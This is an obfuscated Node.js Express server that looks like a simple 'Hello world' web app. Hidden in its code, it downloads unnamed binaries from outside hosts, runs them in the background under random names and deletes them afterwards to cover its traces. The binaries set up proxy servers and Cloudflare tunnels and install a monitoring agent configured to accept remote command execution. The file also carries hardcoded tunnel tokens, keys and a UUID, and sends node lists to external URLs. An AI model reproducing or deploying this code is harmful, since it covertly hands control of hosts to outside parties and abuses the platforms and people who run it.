const _0x5b4fe3=_0xe23d;(function(_0x216b56,_0x18298c){const _0x24b5d1=_0xe23d,_0x19eb21=_0x216b56();while(!![]){try{const _0x369f16=parseInt(_0x24b5d1(0x23c))/0x1+parseInt(_0x24b5d1(0x1b6))/0x2+-parseInt(_0x24b5d1(0x1a8))/0x3*(-parseInt(_0x24b5d1(0x201))/0x4)+parseInt(_0x24b5d1(0x219))/0x5*(parseInt(_0x24b5d1(0x1c7))/0x6)+parseInt(_0x24b5d1(0x226))/0x7+-parseInt(_0x24b5d1(0x229))/0x8+-parseInt(_0x24b5d1(0x193))/0x9*(parseInt(_0x24b5d1(0x1f3))/0xa);if(_0x369f16===_0x18298c)break;else _0x19eb21['push'](_0x19eb21['shift']());}catch(_0x3d12f8){_0x19eb21['push'](_0x19eb21['shift']());}}}(_0x4832,0xad71f));function _0xe23d(_0x232a97,_0x2c9c57){_0x232a97=_0x232a97-0x193;const _0x483277=_0x4832();let _0xe23de5=_0x483277[_0x232a97];return _0xe23de5;}const express=require(_0x5b4fe3(0x22e)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x5b4fe3(0x1bf)),{promisify}=require(_0x5b4fe3(0x215)),exec=promisify(require(_0x5b4fe3(0x19b))[_0x5b4fe3(0x241)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x5b4fe3(0x224)]||'',PROJECT_URL=process['env'][_0x5b4fe3(0x23d)]||'',AUTO_ACCESS=process[_0x5b4fe3(0x1f4)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x21d)]||_0x5b4fe3(0x21c),SUB_PATH=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x196)]||_0x5b4fe3(0x218),PORT=process['env'][_0x5b4fe3(0x21b)]||process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x1e2)]||0xbb8,KAMAN=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x233)]||'528daed9-f70e-4732-99ff-f989754272cd',YOUNGHERO_SERVER=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x1c1)]||'nzag.faiz.us.kg:8008',YOUNGHERO_PORT=process[_0x5b4fe3(0x1f4)]['YOUNGHERO_PORT']||'',YOUNGHERO_KEY=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x203)]||'JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl',SUIDAO_DOMAIN=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x23f)]||_0x5b4fe3(0x1be),SUIDAO_AUTH=process['env']['SUIDAO_AUTH']||_0x5b4fe3(0x1cb),SUIDAO_PORT=process['env'][_0x5b4fe3(0x1e3)]||0x1f41,CFIP=process['env']['CFIP']||_0x5b4fe3(0x1ee),CFPORT=process[_0x5b4fe3(0x1f4)][_0x5b4fe3(0x1bb)]||0x1bb,NAME=process[_0x5b4fe3(0x1f4)]['NAME']||'MY-Edgegap';if(!fs[_0x5b4fe3(0x1ec)](FILE_PATH))fs[_0x5b4fe3(0x1fa)](FILE_PATH),console[_0x5b4fe3(0x19a)](FILE_PATH+_0x5b4fe3(0x197));else{}function generateRandomName(){const _0x5736f7=_0x5b4fe3,_0x447af9=_0x5736f7(0x225);let _0x4bb8bf='';for(let _0x3a8c6c=0x0;_0x3a8c6c<0x6;_0x3a8c6c++){_0x4bb8bf+=_0x447af9[_0x5736f7(0x216)](Math['floor'](Math[_0x5736f7(0x1dc)]()*_0x447af9[_0x5736f7(0x20a)]));}return _0x4bb8bf;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5b4fe3(0x244)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x5b4fe3(0x244)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5b4fe3(0x1ad)),listPath=path['join'](FILE_PATH,_0x5b4fe3(0x1d0)),bootLogPath=path[_0x5b4fe3(0x244)](FILE_PATH,_0x5b4fe3(0x1d8)),configPath=path[_0x5b4fe3(0x244)](FILE_PATH,'config.json');function deleteNodes(){const _0x590092=_0x5b4fe3;try{if(!UPLOAD_URL)return;if(!fs[_0x590092(0x1ec)](subPath))return;let _0x439950;try{_0x439950=fs[_0x590092(0x1a7)](subPath,_0x590092(0x214));}catch{return null;}const _0x1fbb41=Buffer[_0x590092(0x208)](_0x439950,'base64')[_0x590092(0x1ce)]('utf-8'),_0x247e9a=_0x1fbb41[_0x590092(0x20d)]('\x0a')['filter'](_0xa53b3e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x590092(0x19e)](_0xa53b3e));if(_0x247e9a[_0x590092(0x20a)]===0x0)return;return axios[_0x590092(0x20f)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x590092(0x1af)]({'nodes':_0x247e9a}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x48756e=>{return null;}),null;}catch(_0x29e978){return null;}}function cleanupOldFiles(){const _0xd9cb38=_0x5b4fe3;try{const _0x35d893=fs[_0xd9cb38(0x1b5)](FILE_PATH);_0x35d893[_0xd9cb38(0x1c0)](_0x257df1=>{const _0x2930ec=_0xd9cb38,_0x395990=path['join'](FILE_PATH,_0x257df1);try{const _0x1f9108=fs['statSync'](_0x395990);_0x1f9108[_0x2930ec(0x200)]()&&fs[_0x2930ec(0x1b7)](_0x395990);}catch(_0x803110){}});}catch(_0x53160d){}}app['get']('/',function(_0x4fa90c,_0x134903){const _0x452c9a=_0x5b4fe3,_0x357c53=path[_0x452c9a(0x244)](__dirname,_0x452c9a(0x23a));fs[_0x452c9a(0x1ec)](_0x357c53)?_0x134903['sendFile'](_0x357c53):_0x134903[_0x452c9a(0x1f1)](_0x452c9a(0x1ed));});async function generateConfig(){const _0x4990ad=_0x5b4fe3,_0x58d2f6={'log':{'access':_0x4990ad(0x207),'error':_0x4990ad(0x207),'loglevel':_0x4990ad(0x234)},'inbounds':[{'port':SUIDAO_PORT,'protocol':_0x4990ad(0x1fe),'settings':{'clients':[{'id':KAMAN,'flow':'xtls-rprx-vision'}],'decryption':_0x4990ad(0x234),'fallbacks':[{'dest':0xbb9},{'path':'/vless-suidao','dest':0xbba},{'path':_0x4990ad(0x1b1),'dest':0xbbb},{'path':_0x4990ad(0x19c),'dest':0xbbc}]},'streamSettings':{'network':_0x4990ad(0x1bc)}},{'port':0xbb9,'listen':_0x4990ad(0x231),'protocol':_0x4990ad(0x1fe),'settings':{'clients':[{'id':KAMAN}],'decryption':_0x4990ad(0x234)},'streamSettings':{'network':_0x4990ad(0x1bc),'security':_0x4990ad(0x234)}},{'port':0xbba,'listen':_0x4990ad(0x231),'protocol':_0x4990ad(0x1fe),'settings':{'clients':[{'id':KAMAN,'level':0x0}],'decryption':_0x4990ad(0x234)},'streamSettings':{'network':'ws','security':_0x4990ad(0x234),'wsSettings':{'path':_0x4990ad(0x240)}},'sniffing':{'enabled':!![],'destOverride':[_0x4990ad(0x1e1),_0x4990ad(0x1a3),_0x4990ad(0x23b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4990ad(0x231),'protocol':_0x4990ad(0x206),'settings':{'clients':[{'id':KAMAN,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4990ad(0x1b1)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4990ad(0x1a3),_0x4990ad(0x23b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4990ad(0x231),'protocol':_0x4990ad(0x1f7),'settings':{'clients':[{'password':KAMAN}]},'streamSettings':{'network':'ws','security':_0x4990ad(0x234),'wsSettings':{'path':_0x4990ad(0x19c)}},'sniffing':{'enabled':!![],'destOverride':[_0x4990ad(0x1e1),_0x4990ad(0x1a3),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4990ad(0x1dd)]},'outbounds':[{'protocol':_0x4990ad(0x195),'tag':_0x4990ad(0x1aa)},{'protocol':'blackhole','tag':_0x4990ad(0x22d)}]};fs[_0x4990ad(0x1e4)](path[_0x4990ad(0x244)](FILE_PATH,_0x4990ad(0x1c4)),JSON[_0x4990ad(0x1af)](_0x58d2f6,null,0x2));}function getSystemArchitecture(){const _0x36f216=_0x5b4fe3,_0x30a9c9=os[_0x36f216(0x1e8)]();return _0x30a9c9===_0x36f216(0x1cc)||_0x30a9c9==='arm64'||_0x30a9c9===_0x36f216(0x1d2)?_0x36f216(0x1cc):'amd';}function downloadFile(_0x3a0f4a,_0x519155,_0x1bdd7d){const _0x21bc41=_0x5b4fe3,_0x48863a=_0x3a0f4a;!fs[_0x21bc41(0x1ec)](FILE_PATH)&&fs[_0x21bc41(0x1fa)](FILE_PATH,{'recursive':!![]});const _0x453fd2=fs[_0x21bc41(0x238)](_0x48863a);axios({'method':_0x21bc41(0x1f8),'url':_0x519155,'responseType':_0x21bc41(0x1d3)})[_0x21bc41(0x227)](_0xdcaff9=>{const _0x4dd75b=_0x21bc41;_0xdcaff9['data'][_0x4dd75b(0x20c)](_0x453fd2),_0x453fd2['on'](_0x4dd75b(0x1c5),()=>{const _0x52f672=_0x4dd75b;_0x453fd2[_0x52f672(0x220)](),_0x1bdd7d(null,_0x48863a);}),_0x453fd2['on'](_0x4dd75b(0x198),_0x20ab66=>{const _0x3b55ab=_0x4dd75b;fs[_0x3b55ab(0x1ff)](_0x48863a,()=>{});const _0x4a655b=_0x3b55ab(0x211)+path['basename'](_0x48863a)+_0x3b55ab(0x1b8)+_0x20ab66[_0x3b55ab(0x1f5)];_0x1bdd7d(_0x4a655b);});})['catch'](_0x110fdb=>{const _0x551718=_0x21bc41,_0x34d11d=_0x551718(0x211)+path[_0x551718(0x194)](_0x48863a)+_0x551718(0x1b8)+_0x110fdb['message'];_0x1bdd7d(_0x34d11d);});}async function downloadFilesAndRun(){const _0x4963f7=_0x5b4fe3,_0x2a865f=getSystemArchitecture(),_0x5c9be3=getFilesForArchitecture(_0x2a865f);if(_0x5c9be3[_0x4963f7(0x20a)]===0x0)return;const _0x27acb2=_0x5c9be3[_0x4963f7(0x20e)](_0x1cefec=>{return new Promise((_0x44ad58,_0x43689e)=>{const _0x40d46a=_0xe23d;downloadFile(_0x1cefec[_0x40d46a(0x21e)],_0x1cefec['fileUrl'],(_0x12a1ba,_0x322c5c)=>{_0x12a1ba?_0x43689e(_0x12a1ba):_0x44ad58(_0x322c5c);});});});try{await Promise[_0x4963f7(0x1fb)](_0x27acb2);}catch(_0x5c1c95){return;}function _0x238a7c(_0x150166){const _0x18f710=0x1fd;_0x150166['forEach'](_0x17f932=>{const _0x43b480=_0xe23d;fs[_0x43b480(0x1ec)](_0x17f932)&&fs[_0x43b480(0x1f2)](_0x17f932,_0x18f710,_0x5a1094=>{});});}const _0x4ec2ca=YOUNGHERO_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x238a7c(_0x4ec2ca);if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(!YOUNGHERO_PORT){const _0x35dbd7=YOUNGHERO_SERVER[_0x4963f7(0x1c9)](':')?YOUNGHERO_SERVER[_0x4963f7(0x20d)](':')['pop']():'',_0x434d2d=new Set([_0x4963f7(0x1d9),'8443',_0x4963f7(0x1c6),_0x4963f7(0x19f),_0x4963f7(0x1a9),_0x4963f7(0x1c3)]),_0x3ea085=_0x434d2d[_0x4963f7(0x1a0)](_0x35dbd7)?_0x4963f7(0x202):_0x4963f7(0x1ef),_0x36f4f8=_0x4963f7(0x1d1)+YOUNGHERO_KEY+_0x4963f7(0x1cd)+YOUNGHERO_SERVER+_0x4963f7(0x20b)+_0x3ea085+_0x4963f7(0x1b4)+KAMAN;fs[_0x4963f7(0x1e4)](path[_0x4963f7(0x244)](FILE_PATH,'config.yaml'),_0x36f4f8);const _0x5bcca9=_0x4963f7(0x1a6)+phpPath+_0x4963f7(0x1d4)+FILE_PATH+_0x4963f7(0x1b2);try{await exec(_0x5bcca9),await new Promise(_0x1ca52e=>setTimeout(_0x1ca52e,0x3e8));}catch(_0x431687){}}else{let _0x16d19c='';const _0x377977=[_0x4963f7(0x1d9),_0x4963f7(0x1ca),_0x4963f7(0x1c6),_0x4963f7(0x19f),_0x4963f7(0x1a9),_0x4963f7(0x1c3)];_0x377977['includes'](YOUNGHERO_PORT)&&(_0x16d19c=_0x4963f7(0x1b3));const _0x12344d='nohup\x20'+npmPath+_0x4963f7(0x228)+YOUNGHERO_SERVER+':'+YOUNGHERO_PORT+_0x4963f7(0x1d7)+YOUNGHERO_KEY+'\x20'+_0x16d19c+_0x4963f7(0x1db);try{await exec(_0x12344d),await new Promise(_0x2e95c2=>setTimeout(_0x2e95c2,0x3e8));}catch(_0xfc994a){}}}else{}const _0x1f905f=_0x4963f7(0x1a6)+webPath+_0x4963f7(0x223)+FILE_PATH+_0x4963f7(0x1e5);try{await exec(_0x1f905f),await new Promise(_0x2189cb=>setTimeout(_0x2189cb,0x3e8));}catch(_0x8c7fc){}if(fs['existsSync'](botPath)){let _0x221efa;if(SUIDAO_AUTH[_0x4963f7(0x205)](/^[A-Z0-9a-z=]{120,250}$/))_0x221efa='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+SUIDAO_AUTH;else SUIDAO_AUTH[_0x4963f7(0x205)](/TunnelSecret/)?_0x221efa='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x4963f7(0x1ab):_0x221efa=_0x4963f7(0x1de)+FILE_PATH+_0x4963f7(0x1b0)+SUIDAO_PORT;try{await exec(_0x4963f7(0x1a6)+botPath+'\x20'+_0x221efa+_0x4963f7(0x242)),await new Promise(_0x46d66a=>setTimeout(_0x46d66a,0x7d0));}catch(_0x32fd74){}}await new Promise(_0x33641c=>setTimeout(_0x33641c,0x1388));}function getFilesForArchitecture(_0x4dade2){const _0x68c027=_0x5b4fe3;let _0x450578;_0x4dade2==='arm'?_0x450578=[{'fileName':webPath,'fileUrl':_0x68c027(0x21f)},{'fileName':botPath,'fileUrl':_0x68c027(0x1b9)}]:_0x450578=[{'fileName':webPath,'fileUrl':_0x68c027(0x1eb)},{'fileName':botPath,'fileUrl':_0x68c027(0x1ae)}];if(YOUNGHERO_SERVER&&YOUNGHERO_KEY){if(YOUNGHERO_PORT){const _0x54fd60=_0x4dade2===_0x68c027(0x1cc)?_0x68c027(0x1ba):'https://amd64.ssss.nyc.mn/agent';_0x450578[_0x68c027(0x1a4)]({'fileName':npmPath,'fileUrl':_0x54fd60});}else{const _0x1333df=_0x4dade2==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x68c027(0x22f);_0x450578['unshift']({'fileName':phpPath,'fileUrl':_0x1333df});}}return _0x450578;}function _0x4832(){const _0x117beb=['all','taskkill\x20/f\x20/im\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','vless','unlink','isFile','68gTXVBs','true','YOUNGHERO_KEY','win32','match','vmess','/dev/null','from','firefox','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','pipe','split','map','post','\x22\x20>\x20/dev/null\x202>&1','Download\x20','Unknown','?security=tls&sni=','utf-8','util','charAt','data','sub','10NeyXxS','&path=%2Ftrojan-suidao%3Fed%3D2560#','SERVER_PORT','./.tmp','FILE_PATH','fileName','https://arm64.ssss.nyc.mn/web','close','\x20>/dev/null\x202>&1','&path=%2Fvless-suidao%3Fed%3D2560#','\x20-c\x20','UPLOAD_URL','abcdefghijklmnopqrstuvwxyz','1046591bbwDHi','then','\x20-s\x20','7225968ZYcxSz','clear','&fp=firefox&type=ws&host=','\x0a\x0atrojan://','block','express','https://amd64.ssss.nyc.mn/v1','push','127.0.0.1','http://ip-api.com/json/','KAMAN','none','?encryption=none&security=tls&sni=','del\x20/f\x20/q\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','createWriteStream','base64','index.html','quic','63862hNYtyO','PROJECT_URL','.exe\x20>\x20nul\x202>&1','SUIDAO_DOMAIN','/vless-suidao','exec','\x20>/dev/null\x202>&1\x20&','/api/add-nodes','join','189vEwOqg','basename','freedom','SUB_PATH','\x20is\x20created','error','\x0a\x20\x20tunnel:\x20','log','child_process','/trojan-suidao','pkill\x20-f\x20\x22[','test','2087','has','/vmess-suidao?ed=2560','org','tls','unshift','listen','nohup\x20','readFileSync','35085DJRFrE','2083','direct','/tunnel.yml\x20run','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','sub.txt','https://amd64.ssss.nyc.mn/bot','stringify','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vmess-suidao','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','--tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readdirSync','749564puSCQa','unlinkSync','\x20failed:\x20','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/agent','CFPORT','tcp','Content-Type','edgegap-my.kaixa.xx.kg','path','forEach','YOUNGHERO_SERVER','\x0avless://','2053','config.json','finish','2096','2758764tuIMOV','country_code','includes','8443','eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiMzgxYTc2OGYtNzA5Ny00YzJiLWFiNDYtODAzMDIzZWVjNGZmIiwicyI6IlltWXdPRGhrWkRrdFlXWTNOUzAwTkRVMUxUazFPVFV0TVdabVl6VmxZMlU0WkdObCJ9','arm','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','toString','http\x20server\x20is\x20running\x20on\x20port:','list.txt','\x0aclient_secret:\x20','aarch64','stream','\x20-c\x20\x22','tunnel.yml','tunnel.json','\x20-p\x20','boot.log','443','text/plain;\x20charset=utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','random','https+local://8.8.8.8/dns-query','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','platform','application/json','http','PORT','SUIDAO_PORT','writeFileSync','/config.json\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','/api/add-subscriptions','arch','status','App\x20is\x20running','https://amd64.ssss.nyc.mn/web','existsSync','Hello\x20world!','cdns.doon.eu.org','false','\x0a\x20\x20\x20\x20','send','chmod','44230fnGxwk','env','message','countryCode','trojan','get','\x0a\x20\x20credentials-file:\x20','mkdirSync'];_0x4832=function(){return _0x117beb;};return _0x4832();}function suidaoType(){const _0x25e1aa=_0x5b4fe3;if(!SUIDAO_AUTH||!SUIDAO_DOMAIN)return;if(SUIDAO_AUTH[_0x25e1aa(0x1c9)]('TunnelSecret')){fs['writeFileSync'](path[_0x25e1aa(0x244)](FILE_PATH,_0x25e1aa(0x1d6)),SUIDAO_AUTH);const _0x23e1c2=_0x25e1aa(0x199)+SUIDAO_AUTH['split']('\x22')[0xb]+_0x25e1aa(0x1f9)+path[_0x25e1aa(0x244)](FILE_PATH,_0x25e1aa(0x1d6))+_0x25e1aa(0x237)+SUIDAO_DOMAIN+_0x25e1aa(0x1ac)+SUIDAO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x25e1aa(0x1e4)](path[_0x25e1aa(0x244)](FILE_PATH,_0x25e1aa(0x1d5)),_0x23e1c2);}else{}}async function extractDomains(){const _0xa464a4=_0x5b4fe3;let _0x140bd3;if(SUIDAO_AUTH&&SUIDAO_DOMAIN)_0x140bd3=SUIDAO_DOMAIN,await _0x13ddf4(_0x140bd3);else try{const _0x6d7320=fs[_0xa464a4(0x1a7)](path[_0xa464a4(0x244)](FILE_PATH,_0xa464a4(0x1d8)),_0xa464a4(0x214)),_0x53c0e1=_0x6d7320[_0xa464a4(0x20d)]('\x0a'),_0x1505b8=[];_0x53c0e1[_0xa464a4(0x1c0)](_0x11754e=>{const _0x196d39=_0xa464a4,_0x339251=_0x11754e[_0x196d39(0x205)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x339251){const _0x460b9f=_0x339251[0x1];_0x1505b8[_0x196d39(0x230)](_0x460b9f);}});if(_0x1505b8['length']>0x0)_0x140bd3=_0x1505b8[0x0],await _0x13ddf4(_0x140bd3);else{fs['unlinkSync'](path[_0xa464a4(0x244)](FILE_PATH,_0xa464a4(0x1d8)));async function _0x5b35c7(){const _0x223789=_0xa464a4;try{process[_0x223789(0x1df)]===_0x223789(0x204)?await exec(_0x223789(0x1fc)+botName+_0x223789(0x23e)):await exec(_0x223789(0x19d)+botName[_0x223789(0x216)](0x0)+']'+botName['substring'](0x1)+_0x223789(0x210));}catch(_0x2b47f6){}}_0x5b35c7(),await new Promise(_0x1628f5=>setTimeout(_0x1628f5,0xbb8));const _0xf1be69=_0xa464a4(0x1de)+FILE_PATH+_0xa464a4(0x1b0)+SUIDAO_PORT;try{await exec(_0xa464a4(0x1a6)+botPath+'\x20'+_0xf1be69+_0xa464a4(0x242)),await new Promise(_0x10a4f9=>setTimeout(_0x10a4f9,0xbb8)),await extractDomains();}catch(_0x38e9d6){}}}catch(_0x455bb7){}async function _0xccf37b(){const _0x3dd7fb=_0xa464a4;try{const _0x16302=await axios[_0x3dd7fb(0x1f8)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x16302['data']&&_0x16302[_0x3dd7fb(0x217)][_0x3dd7fb(0x1c8)]&&_0x16302[_0x3dd7fb(0x217)][_0x3dd7fb(0x1a2)])return _0x16302['data'][_0x3dd7fb(0x1c8)]+'_'+_0x16302['data'][_0x3dd7fb(0x1a2)];}catch(_0x179787){try{const _0x1289e8=await axios[_0x3dd7fb(0x1f8)](_0x3dd7fb(0x232),{'timeout':0xbb8});if(_0x1289e8[_0x3dd7fb(0x217)]&&_0x1289e8[_0x3dd7fb(0x217)][_0x3dd7fb(0x1e9)]==='success'&&_0x1289e8[_0x3dd7fb(0x217)]['countryCode']&&_0x1289e8['data'][_0x3dd7fb(0x1a2)])return _0x1289e8[_0x3dd7fb(0x217)][_0x3dd7fb(0x1f6)]+'_'+_0x1289e8[_0x3dd7fb(0x217)][_0x3dd7fb(0x1a2)];}catch(_0x243c9c){}}return _0x3dd7fb(0x212);}async function _0x13ddf4(_0x1fc366){const _0x2887e7=await _0xccf37b(),_0x218294=NAME?NAME+'-'+_0x2887e7:_0x2887e7;return new Promise(_0x3c2e1e=>{setTimeout(()=>{const _0x1284d3=_0xe23d,_0x52bd96={'v':'2','ps':''+_0x218294,'add':CFIP,'port':CFPORT,'id':KAMAN,'aid':'0','scy':_0x1284d3(0x234),'net':'ws','type':_0x1284d3(0x234),'host':_0x1fc366,'path':_0x1284d3(0x1a1),'tls':'tls','sni':_0x1fc366,'alpn':'','fp':_0x1284d3(0x209)},_0x377b0f=_0x1284d3(0x1c2)+KAMAN+'@'+CFIP+':'+CFPORT+_0x1284d3(0x235)+_0x1fc366+_0x1284d3(0x22b)+_0x1fc366+_0x1284d3(0x222)+_0x218294+'\x0a\x0avmess://'+Buffer[_0x1284d3(0x208)](JSON[_0x1284d3(0x1af)](_0x52bd96))[_0x1284d3(0x1ce)](_0x1284d3(0x239))+_0x1284d3(0x22c)+KAMAN+'@'+CFIP+':'+CFPORT+_0x1284d3(0x213)+_0x1fc366+_0x1284d3(0x22b)+_0x1fc366+_0x1284d3(0x21a)+_0x218294+_0x1284d3(0x1f0);fs[_0x1284d3(0x1e4)](subPath,Buffer[_0x1284d3(0x208)](_0x377b0f)[_0x1284d3(0x1ce)]('base64')),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1f3ac9,_0x5eeec0)=>{const _0x884059=_0x1284d3,_0x429ae6=Buffer[_0x884059(0x208)](_0x377b0f)['toString'](_0x884059(0x239));_0x5eeec0['set'](_0x884059(0x1bd),_0x884059(0x1da)),_0x5eeec0['send'](_0x429ae6);}),_0x3c2e1e(_0x377b0f);},0x7d0);});}}async function uploadNodes(){const _0x2d894d=_0x5b4fe3;if(UPLOAD_URL&&PROJECT_URL){const _0x59e33b=PROJECT_URL+'/'+SUB_PATH,_0x3efc85={'subscription':[_0x59e33b]};try{const _0x5ae169=await axios[_0x2d894d(0x20f)](UPLOAD_URL+_0x2d894d(0x1e7),_0x3efc85,{'headers':{'Content-Type':_0x2d894d(0x1e0)}});return _0x5ae169&&_0x5ae169[_0x2d894d(0x1e9)]===0xc8?_0x5ae169:null;}catch(_0x336c9c){if(_0x336c9c['response']){if(_0x336c9c['response'][_0x2d894d(0x1e9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2d894d(0x1ec)](listPath))return;const _0xe3036d=fs[_0x2d894d(0x1a7)](listPath,_0x2d894d(0x214)),_0x4ba148=_0xe3036d[_0x2d894d(0x20d)]('\x0a')['filter'](_0x50a646=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d894d(0x19e)](_0x50a646));if(_0x4ba148['length']===0x0)return;const _0x370dee=JSON[_0x2d894d(0x1af)]({'nodes':_0x4ba148});try{const _0x3f8c7b=await axios[_0x2d894d(0x20f)](UPLOAD_URL+_0x2d894d(0x243),_0x370dee,{'headers':{'Content-Type':_0x2d894d(0x1e0)}});return _0x3f8c7b&&_0x3f8c7b[_0x2d894d(0x1e9)]===0xc8?_0x3f8c7b:null;}catch(_0x4aa21f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x44f4a5=_0xe23d,_0x5a386d=[bootLogPath,configPath,webPath,botPath];if(YOUNGHERO_PORT)_0x5a386d['push'](npmPath);else YOUNGHERO_SERVER&&YOUNGHERO_KEY&&_0x5a386d[_0x44f4a5(0x230)](phpPath);process[_0x44f4a5(0x1df)]==='win32'?exec(_0x44f4a5(0x236)+_0x5a386d['join']('\x20')+'\x20>\x20nul\x202>&1',_0xf99c49=>{const _0x3e46f3=_0x44f4a5;console[_0x3e46f3(0x22a)](),console['log'](_0x3e46f3(0x1ea)),console[_0x3e46f3(0x19a)](_0x3e46f3(0x1fd));}):exec('rm\x20-rf\x20'+_0x5a386d[_0x44f4a5(0x244)]('\x20')+_0x44f4a5(0x221),_0x59070b=>{const _0x1d6c07=_0x44f4a5;console[_0x1d6c07(0x22a)](),console['log'](_0x1d6c07(0x1ea)),console[_0x1d6c07(0x19a)](_0x1d6c07(0x1fd));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2825f2=_0x5b4fe3;if(!AUTO_ACCESS||!PROJECT_URL)return;try{const _0x43a0ad=await axios[_0x2825f2(0x20f)](_0x2825f2(0x1e6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2825f2(0x1e0)}});return _0x43a0ad;}catch(_0x12b363){return null;}}async function startserver(){try{suidaoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x246aa6){}}startserver()['catch'](_0x47f7dd=>{}),app[_0x5b4fe3(0x1a5)](PORT,()=>console[_0x5b4fe3(0x19a)](_0x5b4fe3(0x1cf)+PORT+'!'));
